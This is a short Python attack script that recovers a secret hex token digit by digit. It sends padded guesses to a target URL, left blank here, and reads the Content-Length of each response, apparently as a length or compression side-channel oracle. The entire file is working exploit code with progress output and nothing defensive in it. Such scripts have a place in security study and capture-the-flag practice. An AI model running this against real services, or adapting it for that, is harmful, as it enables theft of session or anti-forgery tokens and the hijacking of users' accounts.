# Copyright ©: Miguel Oleo Blanco
# -*- coding: utf-8 -*-

import requests
import time

BASE_URL = ""
MASK = "***********"
#generate an array of all possible hex digits
HEX_DIGITS = [hex(i)[2] for i in range(16)]

def get_content_length(token):
    r = requests.get(BASE_URL + token).headers.get('Content-Length')
    return int(r)

def try_token_variants(token, responB):
    for digit in HEX_DIGITS:
        build1 = f"{token}{digit}{MASK}{MASK}"
        build2 = f"{token}{MASK}{digit}{MASK}"

        req1 = get_content_length(build1)
        print(f"[+] Attempt {build1} => LR: {req1}")

        req2 = get_content_length(build2)
        print(f"[+] Attempt {build2} => LR: {req2}")

        if req1 <= responB and req2 > req1:
            return digit
    return None

def main():
    TOKEN = ""
    count = 0
    check = True
    time_start = time.time()

    print("Scanning for tokens:")
    print("---------------------")

    while check:
        responB = get_content_length(MASK + MASK)

        digit = try_token_variants(TOKEN, responB)
        count += 1

        if digit is not None:
            TOKEN += digit
            print(f"[+] Found matching digit: {digit}")
        else:
            check = False

    print("---------------------")
    print(f"Iterations = {count}")
    print(f"Time elapsed = {time.time() - time_start:.2f} seconds.")
    print(f"Final Token: {TOKEN}")

if __name__ == "__main__":
    main()
